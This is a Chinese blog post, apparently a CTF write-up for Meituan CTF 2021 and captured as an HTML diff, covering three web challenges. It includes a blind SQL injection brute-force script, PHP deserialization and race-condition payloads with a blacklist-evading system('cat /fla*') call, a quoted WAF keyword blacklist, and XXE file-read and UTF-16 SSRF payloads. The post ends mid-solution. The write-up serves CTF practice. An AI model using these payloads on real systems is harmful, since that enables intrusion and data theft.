@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="sql简单的正则盲注，将找到的脚本简单修改即可跑出密码。 12345678910111213141516171819202122232425262728import stringimport requestsdef str_hex(litter):    str &#x3D; &amp;#x27;&amp;#x27;    for i in litter:        str +&#x3D; hex(ord(i)).replace">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Pending]美团 CTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/f43e78a1.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="sql简单的正则盲注，将找到的脚本简单修改即可跑出密码。 12345678910111213141516171819202122232425262728import stringimport requestsdef str_hex(litter):    str &#x3D; &amp;#x27;&amp;#x27;    for i in litter:        str +&#x3D; hex(ord(i)).replace">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-28T07:07:00.000Z">
+<meta property="article:modified_time" content="2021-05-28T07:08:56.827Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>[Pending]美团 CTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/7c083fa1.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&text=[Pending]美团 CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&is_video=false&description=[Pending]美团 CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[Pending]美团 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/f43e78a1.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&name=[Pending]美团 CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&t=[Pending]美团 CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql"><span class="toc-number">1.</span> <span class="toc-text">sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easytricks"><span class="toc-number">2.</span> <span class="toc-text">easytricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xx-elogin"><span class="toc-number">3.</span> <span class="toc-text">xx_elogin</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [Pending]美团 CTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-28T07:07:00.000Z" itemprop="datePublished">2021-05-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p>简单的正则盲注，将找到的脚本简单修改即可跑出密码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">litter</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> litter:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x5e&#x27;</span> + <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = string.ascii_lowercase + string.ascii_uppercase + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        url = <span class="string">&#x27;.../index.php&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;null\\&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;||(`password`/**/regexp/**/binary/**/&#123;&#125;)#&#x27;</span>.<span class="built_in">format</span>(str_hex(flag + j))</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以得出密码为 <code>This_1s_thE_Passw0rd</code>，使用用户名 <code>admin</code> 配合登录即可获得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;afccfbe8-a333-4eed-86ca-1b1967ffb0ae&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="easytricks"><a href="#easytricks" class="headerlink" title="easytricks"></a>easytricks</h3><p>发现有 <code>/admin</code> 路由，同时可以找到部分原题。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105849403">https://blog.csdn.net/SopRomeo/article/details/105849403</a></p>
+</blockquote>
+<p>使用 admin 作为用户名，密码 <code>GoODLUcKcTFer202OHAckFuN</code> 即可成功登录上去。登录之后可以找到如下提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x2F;admin&#x2F;admin.rar --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将源码下载下来，可以在 preload.php 下发现如下关键的源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_save_path(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;new hacker();phpinfo();&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$blacklist</span>=<span class="string">&quot;/flag|pcntl|system|exec|fread|file|fpassthru|popen|proc|ld|putenv|passthru|`|\.|\\\|#|\\$|[0-9]|_|get|~|\\^|eval|assert|open|write|include|require/is&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="variable">$blacklist</span>,<span class="variable">$parm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;waf(<span class="keyword">$this</span>-&gt;contents)||strlen(<span class="keyword">$this</span>-&gt;contents)&gt;<span class="number">60</span>||preg_match_all(<span class="string">&#x27;/\\(/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>||preg_match_all(<span class="string">&#x27;/\\)/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match_all(<span class="string">&#x27;/;/i&#x27;</span>,<span class="keyword">$this</span>-&gt;contents,<span class="variable">$matches</span>)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;try hard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>))&#123;</span><br><span class="line">            unlink(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;class);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;contents,FILE_APPEND);</span><br><span class="line">        file_put_contents(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/hack.php&quot;</span>,<span class="keyword">$this</span>-&gt;method,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">var_dump(unserialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$preload</span>=<span class="keyword">new</span> preload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;a href=<span class="string">&quot;./hack.php&quot;</span>&gt;hack.php&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;./cli.php&quot;</span>&gt;cli.php&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现存在反序列化的可控制点。只需要将内容拼接在 <code>$this-&gt;contents</code> 中即可写入到 hack.php 中，但是马上就会被 <code>$preload=new preload();</code> 重新覆盖掉，因此考虑条件竞争。构造出如下脚本生成反序列化载荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">preload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="string">&quot;&lt;?php class hacker&#123;public function hack()&#123;echo &#x27;hack the hack!I believe you can!&#x27;;&#125;&#125;\$hack=&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents=<span class="string">&quot;&#x27;a&#x27;;?&gt;&lt;?php phpinfo() ?&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method=<span class="string">&quot;\$hack-&gt;hack();&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> preload()));</span><br></pre></td></tr></table></figure>
+
+<p>将生成的载荷以参数 <code>a</code> 提交给 preload 的同时条件竞争访问 hack.php 即有机会触发到 phpinfo。可以得到如下 disable_functions 列表。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,</span><br></pre></td></tr></table></figure>
+
+<p>可以发现其中没有过滤 <code>system()</code>，因此只需要拼接一下即可运行从而得到 flag。构造出如下载荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implode([<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>])(<span class="string">&quot;cat /fla*&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将其拼接在 <code>$this-&gt;contents</code> 中重新生成载荷然后条件竞争即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7b154242-df8e-47df-81dd-4807644335fa&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="xx-elogin"><a href="#xx-elogin" class="headerlink" title="xx_elogin"></a>xx_elogin</h3><p>登录页面的源码可以看出 <code>/api.php</code> 的 XXE，简单构造出如下载荷读取文件。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;&quot;</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=api.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以读到如下源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// 哈哈，我数据库都不用你还能秒我。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;guest&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;guest111222333444555666@#$!&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Location:guest.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="comment">// 仅允许管理员从本地访问，这样总安全了吧！！！</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;admin.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;username or password error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到两份密码，同时考虑使用 SSRF 来登录管理员账户，因此考虑使用 XXE 来进行 SSRF。可以发现如下过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/system/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker go out!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http/i&#x27;</span>,<span class="variable">$xmlfile</span>) &amp;&amp; preg_match(<span class="string">&#x27;/dtd|ENTITY/i&#x27;</span>,<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;禁止出网&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$result</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时可以使用 UTF-16 编码来绕过判断从而达成 SSRF。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$REAL_PAYLOAD</span> = <span class="string">&quot;http://127.0.0.1:80/login.php&quot;</span>;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = <span class="comment">/** <span class="doctag">@lang</span> text */</span></span><br><span class="line">    &lt;&lt;&lt;PAYLOAD</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe <span class="keyword">PUBLIC</span> <span class="string">&quot;123&quot;</span> <span class="string">&quot;PAYLOAD&quot;</span> &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">PAYLOAD;</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = str_replace(<span class="string">&quot;PAYLOAD&quot;</span>, <span class="variable">$REAL_PAYLOAD</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br><span class="line"><span class="variable">$XXE_PAYLOAD</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;utf-16&#x27;</span>, <span class="variable">$XXE_PAYLOAD</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时生成出来的载荷即可成功 SSRF。结合如下代码里的文件上传和管理员登录后的 <code>readgzfile()</code> 函数的调用，考虑触发利用 phar 反序列化。</p>
